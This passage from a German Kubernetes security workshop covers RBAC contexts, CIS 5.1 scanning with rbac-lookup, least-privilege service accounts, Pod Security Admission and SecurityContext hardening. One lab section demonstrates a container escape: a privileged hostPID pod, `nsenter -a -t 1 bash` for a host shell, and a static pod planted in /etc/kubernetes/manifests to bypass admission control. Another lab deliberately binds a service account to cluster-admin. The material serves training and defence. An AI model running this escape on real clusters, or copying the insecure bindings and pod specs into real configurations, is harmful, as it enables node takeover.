Der Cluster-Name in einem kubeadm-Cluster lautet `kubernetes`:

```
kubectl config set-context training-ctx \
  --cluster kubernetes \
  --user training<nr>

kubectl config set-credentials training<nr> --token=$TOKEN
```

Beide Contexts anzeigen:

```
kubectl config get-contexts
```

```
CURRENT   NAME                          CLUSTER      AUTHINFO           NAMESPACE
*         kubernetes-admin@kubernetes   kubernetes   kubernetes-admin
          training-ctx                  kubernetes   training<nr>
```

---

### Schritt 7: Context wechseln und Rechte testen

```
kubectl config use-context training-ctx
```

Erlaubte Aktion — Pods auflisten:

```
kubectl get pods
```

Verbotene Aktion — Deployments auflisten:

```
kubectl get deployments
```

**Erwarteter Fehler:**
```
Error from server (Forbidden): deployments.apps is forbidden:
User "system:serviceaccount:default:training<nr>" cannot list resource
"deployments" in API group "apps" in the namespace "default"
```

---

### Schritt 8: Zurueck zum Admin-Context

```
kubectl config use-context kubernetes-admin@kubernetes
```

Verifizieren:

```
kubectl config get-contexts
```

```
CURRENT   NAME                          CLUSTER      AUTHINFO           NAMESPACE
*         kubernetes-admin@kubernetes   kubernetes   kubernetes-admin
          training-ctx                  kubernetes   training<nr>
```

---

### Aufraeumen

```
kubectl config delete-context training-ctx
kubectl config unset users.training<nr>
```

```
kubectl delete -f .
```

---

### Zusammenfassung

| Was | Wie |
|-----|-----|
| SA + Token anlegen | ServiceAccount + Secret mit Annotation |
| Rechte vergeben | ClusterRole + RoleBinding (namespace-scoped) |
| Rechte testen | `kubectl auth can-i ... --as system:serviceaccount:...` |
| Token auslesen | `kubectl get secret ... -o jsonpath='{.data.token}' | base64 --decode` |
| Zweites Profil | `kubectl config set-context` + `set-credentials` |
| Context wechseln | `kubectl config use-context <name>` |
| Zurueck zu Admin | `kubectl config use-context kubernetes-admin@kubernetes` |

### Kap. 5.1 - RBAC Scanning: Schwachstellen mit rbac-lookup finden


### Hintergrund: CIS Benchmark - RBAC Controls (Sektion 5.1)

| CIS ID | Kontrolle |
|--------|-----------|
| 5.1.1 | cluster-admin nur wo noetig |
| 5.1.3 | Keine Wildcards in Roles/ClusterRoles |
| 5.1.5 | default ServiceAccount nicht an aktive Rolle binden |
| 5.1.6 | SA-Tokens nicht automatisch mounten |
| 5.1.7 | system:masters Gruppe vermeiden |

`rbac-lookup` scannt den Cluster und zeigt, welche Subjekte (User, Gruppen,
ServiceAccounts) welche Rollen haben — ideal um CIS-Findings zu verifizieren.

---

### Schritt 1: rbac-lookup installieren

Das Tool wird im eigenen Home-Verzeichnis installiert — kein root noetig.
`~/bin` ist bereits im PATH aller Workshop-User.

```
mkdir -p ~/bin
curl -sL https://github.com/FairwindsOps/rbac-lookup/releases/download/v0.10.3/rbac-lookup_0.10.3_Linux_x86_64.tar.gz \
  | tar -xz -C ~/bin rbac-lookup
```

Version pruefen:

```
rbac-lookup version
```

Erwartete Ausgabe:
```
Version:0.10.3 Commit:46385c500f47267607a2cdde63feef59247615f5
```

---

### Schritt 2: Alle cluster-admin Bindings finden (CIS 5.1.1)

```
rbac-lookup -o wide system:masters
```

```
rbac-lookup -o wide cluster-admin
```

Alle Gruppen mit Rollen anzeigen — hier ist `system:masters` besonders kritisch:

```
rbac-lookup -k group
```

**Erwartete Findings:**
```
SUBJECT                  SCOPE          ROLE
system:masters           cluster-wide   ClusterRole/cluster-admin
kubeadm:cluster-admins   cluster-wide   ClusterRole/cluster-admin
```

CIS 5.1.7: Die Gruppe `system:masters` umgeht RBAC komplett und sollte
**niemals** fuer normale Nutzer verwendet werden.

---

### Schritt 3: Alle ServiceAccount-Bindungen scannen

```
rbac-lookup -k serviceaccount
```

Gezielt nach einem Namespace suchen:

```
rbac-lookup -k serviceaccount | grep kube-system | head -20
```

---

### Schritt 4: Wildcards in ClusterRoles finden (CIS 5.1.3)

```
kubectl get clusterroles -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data.get('items', []):
    name = item['metadata']['name']
    if name.startswith('system:'):
        continue
    for rule in item.get('rules', []):
        if '*' in rule.get('verbs', []) or '*' in rule.get('resources', []):
            print(f'WILDCARD in: {name}')
            print(f'  rule: {rule}')
"
```

---

### Schritt 5: Absichtlich eine unsichere Bindung erstellen

Jetzt demonstrieren wir das Problem: ein overprivileged ServiceAccount.

```
cd
mkdir -p manifests/rbac-demo
cd manifests/rbac-demo
```

```
## vi 01-bad-sa.yml
apiVersion: v1
kind: Namespace
metadata:
  name: rbac-demo
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: overprivileged-app
  namespace: rbac-demo
```

```
## vi 02-bad-binding.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: overprivileged-app-admin
subjects:
- kind: ServiceAccount
  name: overprivileged-app
  namespace: rbac-demo
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

```
kubectl apply -f .
```

---

### Schritt 6: Scan wiederholen — Finding nachweisen

```
rbac-lookup -k serviceaccount | grep overprivileged
```

**Erwartete Ausgabe:**
```
SUBJECT                           SCOPE          ROLE
rbac-demo:overprivileged-app      cluster-wide   ClusterRole/cluster-admin
```

Das ist ein klarer CIS 5.1.1-Verstoss: ein normaler App-ServiceAccount
mit cluster-admin Rechten.

Testen — was kann dieser ServiceAccount alles?

```
kubectl auth can-i --list --as=system:serviceaccount:rbac-demo:overprivileged-app | head -10
```

**Erwartete Ausgabe: Fast alles erlaubt (`*`)**

---

### Schritt 7: Unsichere Bindung entfernen

```
kubectl delete clusterrolebinding overprivileged-app-admin
```

Verifizieren:

```
rbac-lookup -k serviceaccount | grep overprivileged
## Keine Ausgabe mehr
```

---

### Aufraumen

```
kubectl delete namespace rbac-demo
kubectl delete clusterrolebinding overprivileged-app-admin 2>/dev/null || true
```

---

### Zusammenfassung

| CIS Kontrolle | Wie pruefen |
|---------------|-------------|
| 5.1.1 cluster-admin | `rbac-lookup system:masters` |
| 5.1.3 Wildcards | `kubectl get clusterroles -o json` + Filter |
| 5.1.5 default SA | `rbac-lookup default` |
| 5.1.7 system:masters | `rbac-lookup -k group` |

### Referenzen

  * https://github.com/FairwindsOps/rbac-lookup
  * https://www.cisecurity.org/benchmark/kubernetes (Sektion 5.1)

### Kap. 5.1.2/5.1.6 - RBAC Least Privilege für Entwickler-Namespace


### Hintergrund: Prinzip der minimalen Rechte

Ein ServiceAccount sollte **nur** die Rechte haben, die er tatsaechlich benoetigt.
Typische Fehler:

| Problem | CIS Referenz | Risiko |
|---------|--------------|--------|
| SA hat cluster-admin | 5.1.1 | Kompletter Cluster-Zugriff bei Kompromittierung |
| Token automatisch gemountet | 5.1.6 | Jeder Pod kann API nutzen |
| Wildcard-Verbs (`*`) | 5.1.3 | Unbeabsichtigte Rechte |

---

### Schritt 1: Vorbereitung

```
cd
mkdir -p manifests/rbac-leastpriv
cd manifests/rbac-leastpriv
```

```
kubectl create namespace rbac-leastpriv
```

---

### Schritt 2: ServiceAccount mit deaktiviertem Auto-Mount erstellen (CIS 5.1.6)

```
## vi 01-serviceaccount.yml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: dev-readonly
  namespace: rbac-leastpriv
automountServiceAccountToken: false
```

```
kubectl apply -f 01-serviceaccount.yml -n rbac-leastpriv
```

Ohne `automountServiceAccountToken: false` wird in jeden Pod automatisch ein Token
gemountet — selbst wenn die App die Kubernetes API gar nicht braucht.

---

### Schritt 3: Role mit minimalen Rechten (nur Pods lesen)

```
## vi 02-role.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: rbac-leastpriv
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
```

```
kubectl apply -f 02-role.yml -n rbac-leastpriv
```

**Bewusste Einschraenkung:**
- Kein `*` bei verbs (CIS 5.1.3)
- Nur `pods`, keine Secrets, ConfigMaps, Deployments
- Nur im eigenen Namespace (Role, nicht ClusterRole)

---

### Schritt 4: RoleBinding erstellen

```
## vi 03-rolebinding.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dev-readonly-binding
  namespace: rbac-leastpriv
subjects:
- kind: ServiceAccount
  name: dev-readonly
  namespace: rbac-leastpriv
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

```
kubectl apply -f 03-rolebinding.yml -n rbac-leastpriv
```

---

### Schritt 5: Rechte testen mit kubectl auth can-i

```
## Was darf der ServiceAccount?
kubectl auth can-i get pods \
  --as=system:serviceaccount:rbac-leastpriv:dev-readonly \
  -n rbac-leastpriv
```

**Erwartet: yes**

```
## Darf er Secrets lesen? (sollte nicht!)
kubectl auth can-i get secrets \
  --as=system:serviceaccount:rbac-leastpriv:dev-readonly \
  -n rbac-leastpriv
```

**Erwartet: no**

```
## Darf er Pods in kube-system sehen? (sollte nicht!)
kubectl auth can-i list pods \
  --as=system:serviceaccount:rbac-leastpriv:dev-readonly \
  -n kube-system
```

**Erwartet: no**

```
## Vollstaendige Rechteuebersicht
kubectl auth can-i --list \
  --as=system:serviceaccount:rbac-leastpriv:dev-readonly \
  -n rbac-leastpriv
```

---

### Schritt 6: Pod mit korrektem ServiceAccount deployen

```
## vi 04-pod.yml
apiVersion: v1
kind: Pod
metadata:
  name: dev-app
spec:
  serviceAccountName: dev-readonly
  automountServiceAccountToken: false
  containers:
  - name: app
    image: nginx:alpine
    resources:
      requests:
        cpu: "50m"
        memory: "64Mi"
      limits:
        cpu: "100m"
        memory: "128Mi"
```

```
kubectl apply -f 04-pod.yml -n rbac-leastpriv
kubectl get pods -n rbac-leastpriv
```

Pruefen ob kein Token gemountet ist:

```
kubectl exec -n rbac-leastpriv dev-app -- ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "Kein Token gemountet - korrekt!"
```

---

### Schritt 7: Scan mit rbac-lookup zur Verifikation

```
rbac-lookup -k serviceaccount | grep rbac-leastpriv
```

**Erwartete Ausgabe:**
```
SUBJECT                          SCOPE             ROLE
rbac-leastpriv:dev-readonly      rbac-leastpriv    Role/pod-reader
```

Kein cluster-wide Scope, kein cluster-admin — der ServiceAccount ist
korrekt eingeschraenkt.

---

### Aufraumen

```
kubectl delete namespace rbac-leastpriv
```

---

### Zusammenfassung

| Was | Warum | CIS |
|-----|-------|-----|
| `automountServiceAccountToken: false` | Kein automatischer API-Zugang | 5.1.6 |
| Role statt ClusterRole | Scope auf Namespace begrenzen | 5.1.1 |
| Nur spezifische Verbs | Keine Wildcard-Rechte | 5.1.3 |
| Keine Secrets im Role | Geringste Rechte | 5.1.2 |

### Referenzen

  * https://kubernetes.io/docs/reference/access-authn-authz/rbac/
  * https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
  * https://www.cisecurity.org/benchmark/kubernetes (Sektion 5.1)

## Kubernetes - Pod Security Admission (PSA)

### Kap. 5.2.1 - PSA: Namespace-weite Durchsetzung von Pod Security Standards


### Hintergrund: Warum PSA?

Die `securitycontext-exercise` zeigt, *wie* man Pods korrekt konfiguriert.
Das Problem: SecurityContext ist ein **"Trust the Developer"**-Ansatz. Jeder muss
es jedes Mal richtig machen — und in einem Team mit vielen Entwicklern, unter
Zeitdruck oder bei neuen Mitarbeitern passiert es unvermeidlich, dass jemand
`runAsNonRoot` vergisst, Capabilities nicht droppt oder `allowPrivilegeEscalation`
nicht setzt. Das Ergebnis ist ein root-Container in Produktion, ohne dass jemand
es bemerkt.

PSA ist die **technische Durchsetzung** dieser Anforderungen auf Cluster-Ebene:

- **Kein Vertrauen in die Konfiguration des Einzelnen** — der Cluster lehnt
  nicht-konforme Pods ab, bevor sie starten
- **Sofortiges Feedback** — der Entwickler sieht beim `kubectl apply` exakt,
  was fehlt, nicht erst im Monitoring
- **Defense in Depth** — auch wenn ein Angreifer einen Pod einschleusen kann,
  verhindert PSA, dass er privilegiert laeuft

PSA ist seit Kubernetes 1.25 fest eingebaut — kein zusaetzlicher Controller,
kein Helm Chart, nur Namespace-Labels.

| CIS | Anforderung | PSA-Profil |
|-----|-------------|------------|
| **5.2.1** | Mindestens ein aktiver Policy-Enforcement-Mechanismus | PSA aktivieren |
| 5.2.2 | Keine privilegierten Container | `baseline` / `restricted` |
| 5.2.6 | Kein `allowPrivilegeEscalation` | `restricted` |
| 5.2.7 | Keine Root-Container | `restricted` |

#### Die drei Modi

| Modus | Label | Wirkung |
|-------|-------|---------|
| `enforce` | `pod-security.kubernetes.io/enforce` | Pod wird **abgelehnt** |
| `warn`    | `pod-security.kubernetes.io/warn`    | Pod laeuft, aber **Warnung** im Terminal |
| `audit`   | `pod-security.kubernetes.io/audit`   | Pod laeuft, Verstoss landet im **Audit-Log** |

#### Die drei Profile

| Profil | Beschreibung |
|--------|-------------|
| `privileged` | Keine Einschraenkungen |
| `baseline` | Verhindert bekannte Privilege-Escalation-Vektoren |
| `restricted` | Streng: non-root, no caps, seccomp, kein hostPath |

> **Wichtig:** PSA greift nur auf neue Pods — bereits laufende Container werden nicht nachtraeglich beendet.

---

### Schritt 1: Namespace mit PSA-Labels anlegen

```
cd
mkdir -p manifests/psa
cd manifests/psa
```

```
nano 01-ns.yml
```

```
apiVersion: v1
kind: Namespace
metadata:
  name: psa-restricted
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
```

```
kubectl apply -f 01-ns.yml
kubectl get namespace psa-restricted --show-labels
```

**Erwartete Ausgabe (Labels sichtbar):**
```
NAME          STATUS   AGE   LABELS
psa-restricted   Active   5s    pod-security.kubernetes.io/enforce=restricted,...
```

---

### Schritt 2: Root-Container wird abgelehnt

```
nano 02-nginx-root.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-root
  namespace: psa-restricted
spec:
  containers:
  - name: nginx
    image: nginx:1.27
```

```
kubectl apply -f 02-nginx-root.yml
```

**Erwartete Ablehnung:**
```
Error from server (Forbidden): pods "nginx-root" is forbidden:
violates PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false (container "nginx" must set
  securityContext.allowPrivilegeEscalation=false),
  unrestricted capabilities (container "nginx" must set
  securityContext.capabilities.drop=["ALL"]),
  runAsNonRoot != true (pod or container "nginx" must set
  securityContext.runAsNonRoot=true),
  seccompProfile (pod or container "nginx" must set
  securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

PSA blockiert den Pod direkt beim `kubectl apply` — der Container wird nie gestartet.

---

### Schritt 3: Compliant Pod laeuft durch

```
nano 03-nginx-ok.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-ok
  namespace: psa-restricted
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: nginx
    image: nginxinc/nginx-unprivileged:1.27
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
```

```
kubectl apply -f 03-nginx-ok.yml
kubectl get pod nginx-ok -n psa-restricted
```

**Erwartete Ausgabe:**
```
NAME       READY   STATUS    RESTARTS   AGE
nginx-ok   1/1     Running   0          5s
```

---

### Schritt 4: warn-Modus verstehen

Im `warn`-Modus (`enforce: baseline`) laeuft der Pod durch — der Entwickler sieht
aber sofort die Warnung im Terminal. Gut fuer eine Einfuehrungsphase vor echtem Enforcement.

```
nano 04-ns-warn.yml
```

```
apiVersion: v1
kind: Namespace
metadata:
  name: psa-warn
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
```

```
kubectl apply -f 04-ns-warn.yml
```

```
nano 05-nginx-warn.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-warn
  namespace: psa-warn
spec:
  containers:
  - name: nginx
    image: nginx:1.27
```

```
kubectl apply -f 05-nginx-warn.yml
```

**Erwartete Ausgabe — Pod laeuft, aber Warnung:**
```
Warning: would violate PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false, ...
pod/nginx-warn created
```

---

### Grenzen von PSA — und wann Kyverno oder OPA Gatekeeper

PSA ist in Kubernetes eingebaut und braucht keine zusaetzlichen Komponenten.
Fuer alles darueber hinaus braucht man ein externes Admission-Control-Framework.

| Was PSA nicht kann | Loesung |
|-------------------|---------|
| Nur Images aus erlaubten Registries zulassen | Kyverno / OPA |
| Fehlende SecurityContext automatisch ergaenzen (Mutation) | Kyverno |
| Cluster-weite Policies ohne Namespace-Labels | Kyverno / OPA |
| Custom-Rules (z.B. Labelpflicht fuer alle Deployments) | Kyverno / OPA |
| Nicht-Pod-Ressourcen validieren (Ingress, ConfigMap) | Kyverno / OPA |
| Verschiedene Regeln pro Team / Projekt | Kyverno / OPA |

#### Kyverno vs. OPA Gatekeeper

**Kyverno** — empfohlen fuer die meisten Teams:
- Policies sind normales Kubernetes-YAML — keine neue Sprache
- Unterstuetzt Validation, Mutation und Generation
- Einfach installiert (Helm), grosse Community-Bibliothek mit fertigen Policies
- Gut geeignet fuer: Image-Registry-Restriction, Auto-Labels, Seccomp-Enforcement

**OPA Gatekeeper** — fuer komplexe Anforderungen:
- Policies in Rego (eigene Sprache) — maechtiger, aber steile Lernkurve
- Sinnvoll wenn: OPA bereits fuer andere Systeme im Einsatz ist (z.B. Terraform, Envoy)
- Besser fuer sehr individuelle Unternehmensregelwerke

**Empfehlung:** PSA zuerst aktivieren (kein Overhead, sofort wirksam), dann Kyverno
fuer alles was PSA nicht kann. OPA Gatekeeper nur wenn Rego bereits bekannt ist
oder OPA bereits im Stack vorhanden ist.

---

### Aufraeumen

```
kubectl delete namespace psa-restricted psa-warn
```

---

### Zusammenfassung

| Szenario | Ergebnis |
|----------|----------|
| Root-Container in `enforce: restricted` Namespace | Abgelehnt |
| Root-Container in `warn: restricted` / `enforce: baseline` Namespace | Warnung, laeuft |
| Compliant Pod in `enforce: restricted` Namespace | Laeuft |
| Namespace ohne PSA-Labels | Keine Einschraenkung |

### Referenzen

  * https://kubernetes.io/docs/concepts/security/pod-security-admission/
  * https://kubernetes.io/docs/concepts/security/pod-security-standards/
  * https://kyverno.io/
  * https://open-policy-agent.github.io/gatekeeper/
  * CIS Kubernetes Benchmark V1.12.0, Sektion 5.2

## Kubernetes - hostPID Exploit (Demo)

### hostPID + privileged: Ausbruch aus dem Pod auf das Host-System


### Hintergrund

`hostPID: true` im Pod-Spec erlaubt dem Container, **alle Prozesse des Host-Systems**
zu sehen — nicht nur die eigenen. Kombiniert mit `privileged: true` und dem Tool
`nsenter` kann ein Angreifer damit vollstaendig aus dem Container auf den Node ausbrechen.

| Direktive | Wirkung |
|-----------|---------|
| `hostPID: true` | Pod sieht den PID-Namespace des Hosts (alle Prozesse) |
| `privileged: true` | Container laeuft ohne Capability-Beschraenkungen (root auf dem Node) |
| `nsenter` | Wechselt in beliebige Linux-Namespaces eines anderen Prozesses |

**Angriffskette:**
1. Pod mit `hostPID` + `privileged` starten
2. PID 1 des Hosts sehen → `nsenter -a -t 1 bash` → Shell auf dem Host
3. Zugriff auf `/etc/kubernetes/manifests` → Static Pod anlegen → Admission Controller wird umgangen

---

### Schritt 1: Angreifer-Pod starten

```
cd
mkdir -p manifests/hostpid
cd manifests/hostpid
```

```
## vi 01-masterpod.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: hostmagic
  name: hostmagic
spec:
  containers:
    - command:
      - nsenter
      - --mount=/proc/1/ns/mnt
      - --
      - /bin/sleep
      - 99d
      image: alpine
      name: me
      securityContext:
        privileged: true
  dnsPolicy: ClusterFirst
  hostPID: true
  nodeName: k8s-tln1-w1
```

> `nodeName` anpassen: `k8s-tln1-w1` → eigene Teilnehmernummer einsetzen.
> Den Node-Namen mit `kubectl get nodes` herausfinden.

```
kubectl apply -f 01-masterpod.yaml
kubectl get pod hostmagic
```

---

### Schritt 2: Zweiten Pod auf demselben Node starten (Opfer)

```
## vi 02-nginx.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx-victim
  name: nginx-victim
spec:
  containers:
  - image: nginx
    name: nginx-victim
  nodeName: k8s-tln1-w1
```

```
kubectl apply -f 02-nginx.yaml
kubectl wait pod nginx-victim --for=condition=Ready --timeout=60s
```

---

### Schritt 3: Host-Prozesse aus dem Pod sehen

```
## Alle nginx-Prozesse des Hosts sehen
kubectl exec -it hostmagic -- pgrep -a nginx
```

**Erwartete Ausgabe:** nginx-PIDs — obwohl nginx in einem anderen Pod laeuft.

---

### Schritt 4: In den Netzwerk-Namespace des Opfer-Pods einsteigen

```
## PID aus Schritt 3 einsetzen (z.B. 153770)
kubectl exec -it hostmagic -- nsenter -n -t <PID> ss -ln
```

Wir sehen die offenen Ports des nginx-Containers — aus unserem Pod heraus.

---

### Schritt 5: Vollstaendiger Ausbruch auf den Host

```
## Shell direkt auf dem Host-System (PID 1 = init/systemd)
kubectl exec -it hostmagic -- nsenter -a -t 1 bash
```

Jetzt laeuft die Shell **auf dem Node**, nicht mehr im Container.

```
## Beweis: Hostname des Nodes
hostname

## Host-Prozesse
ps aux | head -10

## Container-Runtime auf dem Node
crictl ps
```

---

### Schritt 6: Static Pod anlegen (Admission Controller umgehen)

```
## Wir sind noch in der Host-Shell aus Schritt 5
cd /etc/kubernetes/manifests

cat > nginxme.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: nginxme
spec:
  containers:
    - image: nginx
      name: me
EOF
```

```
## kubelet erkennt die Datei automatisch und startet den Pod
crictl ps | grep nginxme
```

**Beobachtung:** Der Pod laeuft direkt auf dem Node — ohne dass der Admission Controller
ihn gesehen hat. NetworkPolicies, PSA und RBAC greifen hier nicht.

```
## Aufraumen: Datei loeschen, kubelet beendet den Pod automatisch
rm /etc/kubernetes/manifests/nginxme.yaml
exit
```

---

### Schritt 7: Aufraemen

```
kubectl delete pod hostmagic nginx-victim
```

---

### Gegenmaßnahmen

| Maßnahme | Beschreibung |
|----------|-------------|
| `hostPID: false` (Default) | Nie explizit auf `true` setzen |
| Pod Security Admission (`restricted`) | Blockiert `privileged` und `hostPID` |
| `privileged: false` / `allowPrivilegeEscalation: false` | SecurityContext haerten |
| Admission Controller (OPA/Kyverno) | Policy: `hostPID` verboten |
| Node-Zugriff einschraenken | `/etc/kubernetes/manifests` nur fuer root zugaenglich |

### Referenz

  * https://github.com/kubernetes/kubeadm/issues/1541

## Kubernetes - SecurityContext

### Kap. 5.2.2/5.2.4/5.2.6/5.2.7/5.2.9 - Pods haerten: non-root, read-only, Capabilities, Seccomp


### Hintergrund

Ein `securityContext` legt fest, mit welchen Rechten ein Pod oder Container laeuft.
Ohne expliziten SecurityContext laeuft jeder Container standardmaessig als **root** —
ein Angreifer, der aus dem Container ausbricht, hat damit direkt root-Zugriff auf den Node.

| Einstellung | Beschreibung | CIS |
|-------------|-------------|-----|
| `runAsNonRoot: true` | Container darf nicht als root starten | 5.2.7 |
| `runAsUser` | Konkrete UID setzen (nicht 0) | 5.2.7 |
| `readOnlyRootFilesystem` | Filesystem ist schreibgeschuetzt | 5.2.4 |
| `allowPrivilegeEscalation: false` | Kein sudo/setuid moeglich | 5.2.6 |
| `capabilities.drop: ["ALL"]` | Alle Linux-Capabilities entfernen | 5.2.9 |
| `seccompProfile: RuntimeDefault` | Syscall-Filter aktivieren | 5.2.2 |

---

### Schritt 1: Problem zeigen - Pod laeuft als root

```
cd
mkdir -p manifests/securitycontext
cd manifests/securitycontext
```

```
kubectl create namespace securitycontext
```

```
## vi 01-pod-root.yml
apiVersion: v1
kind: Pod
metadata:
  name: pod-root
spec:
  containers:
  - name: app
    image: nginx:1.27
```

```
kubectl apply -f 01-pod-root.yml -n securitycontext
```

Als welcher User laeuft der Container?

```
kubectl exec -n securitycontext pod-root -- id
```

**Erwartete Ausgabe:**
```
uid=0(root) gid=0(root) groups=0(root)
```

Kann der Container ins Filesystem schreiben?

```
kubectl exec -n securitycontext pod-root -- touch /test-file && echo "Schreiben moeglich!"
```

Das ist das Problem: root im Container, volles Schreibrecht.

---

### Schritt 2: runAsNonRoot und runAsUser

```
## vi 02-pod-nonroot.yml
apiVersion: v1
kind: Pod
metadata:
  name: pod-nonroot
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
  containers:
  - name: app
    image: nginxinc/nginx-unprivileged:1.27
```

```
kubectl apply -f 02-pod-nonroot.yml -n securitycontext
kubectl get pod pod-nonroot -n securitycontext
```

User pruefen:

```
kubectl exec -n securitycontext pod-nonroot -- id
```

**Erwartete Ausgabe:**
```
uid=1000 gid=1000 groups=1000
```

> Hinweis: Wir verwenden `nginxinc/nginx-unprivileged` statt `nginx:1.27`.
> Das Standard-nginx-Image besteht darauf, als root zu starten — und wuerde
> mit `runAsNonRoot: true` sofort crashen. nginx-unprivileged ist fuer
> non-root gebaut und lauscht auf Port **8080** statt 80.

---

### Schritt 3: readOnlyRootFilesystem + emptyDir

Ein read-only Filesystem verhindert, dass Malware sich ins Container-Filesystem schreibt.
Fuer Verzeichnisse, die nginx zum Schreiben braucht, legen wir `emptyDir`-Volumes an.

```
## vi 03-pod-readonly.yml
apiVersion: v1
kind: Pod
metadata:
  name: pod-readonly
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
  containers:
  - name: app
    image: nginxinc/nginx-unprivileged:1.27
    securityContext:
      readOnlyRootFilesystem: true
    volumeMounts:
    - name: cache
      mountPath: /var/cache/nginx
    - name: run
      mountPath: /var/run
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: cache
    emptyDir: {}
  - name: run
    emptyDir: {}
  - name: tmp
    emptyDir: {}
```

```
kubectl apply -f 03-pod-readonly.yml -n securitycontext
kubectl get pod pod-readonly -n securitycontext
```

Schreibversuch ins Root-Filesystem:

```
kubectl exec -n securitycontext pod-readonly -- touch /test-file
```

**Erwarteter Fehler:**
```
touch: /test-file: Read-only file system
```

Schreiben in erlaubtes Verzeichnis funktioniert noch:

```
kubectl exec -n securitycontext pod-readonly -- touch /tmp/test-file && echo "tmp ist schreibbar"
```

---

### Schritt 4: Capabilities droppen + Privilege Escalation verbieten

Linux-Capabilities geben Prozessen einzelne root-Privilegien (z.B. `NET_RAW` fuer
raw Sockets, `SYS_ADMIN` fuer Kernel-Operationen). Standardmaessig erbt ein Container
eine Reihe davon — wir droppen alle.

```
## vi 04-pod-nocaps.yml
apiVersion: v1
kind: Pod
metadata:
  name: pod-nocaps
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
  containers:
  - name: app
    image: nginxinc/nginx-unprivileged:1.27
    securityContext:
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: cache
      mountPath: /var/cache/nginx
    - name: run
      mountPath: /var/run
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: cache
    emptyDir: {}
  - name: run
    emptyDir: {}
  - name: tmp
    emptyDir: {}
```

```
kubectl apply -f 04-pod-nocaps.yml -n securitycontext
kubectl get pod pod-nocaps -n securitycontext
```

Capabilities pruefen:

```
kubectl exec -n securitycontext pod-nocaps -- cat /proc/1/status | grep Cap
```

**Erwartete Ausgabe:** Alle Capability-Werte sind `0000000000000000` — keine Capabilities aktiv.

---

### Schritt 5: Seccomp-Profil aktivieren

Seccomp (Secure Computing Mode) filtert erlaubte Linux-Syscalls.
`RuntimeDefault` verwendet das vom Container-Runtime vorgegebene Profil
und blockiert gefaehrliche Syscalls wie `ptrace` oder `mount`.

```
## vi 05-pod-hardened.yml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hardened
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: nginxinc/nginx-unprivileged:1.27
    ports:
    - containerPort: 8080
    securityContext:
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: cache
      mountPath: /var/cache/nginx
    - name: run
      mountPath: /var/run
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: cache
    emptyDir: {}
  - name: run
    emptyDir: {}
  - name: tmp
    emptyDir: {}
```

```
kubectl apply -f 05-pod-hardened.yml -n securitycontext
kubectl get pod pod-hardened -n securitycontext
```

Pod laeuft und ist voll gehaertet:

```
kubectl exec -n securitycontext pod-hardened -- id
kubectl exec -n securitycontext pod-hardened -- curl -s http://localhost:8080 | head -5
```

---

### Schritt 6: Vergleich mit kube-bench / Scan

Was wuerde kube-bench zu unserem urspruenglichen Pod sagen?

```
kubectl get pod pod-root -n securitycontext -o json | python3 -c "
import sys, json
p = json.load(sys.stdin)
c = p['spec']['containers'][0]
sc = c.get('securityContext', {})
psc = p['spec'].get('securityContext', {})
checks = {
  'runAsNonRoot':             psc.get('runAsNonRoot', False),
  'readOnlyRootFilesystem':   sc.get('readOnlyRootFilesystem', False),
  'allowPrivilegeEscalation': sc.get('allowPrivilegeEscalation', True) == False,
  'capabilities dropped':     sc.get('capabilities', {}).get('drop', []) == ['ALL'],
  'seccompProfile':           psc.get('seccompProfile', {}).get('type') == 'RuntimeDefault',
}
for k, v in checks.items():
    status = 'PASS' if v else 'FAIL'
    print(f'  {status}  {k}')
"
```

Dasselbe fuer den gehaerteten Pod:

```
kubectl get pod pod-hardened -n securitycontext -o json | python3 -c "
import sys, json
p = json.load(sys.stdin)
c = p['spec']['containers'][0]
sc = c.get('securityContext', {})
psc = p['spec'].get('securityContext', {})
checks = {
  'runAsNonRoot':             psc.get('runAsNonRoot', False),
  'readOnlyRootFilesystem':   sc.get('readOnlyRootFilesystem', False),
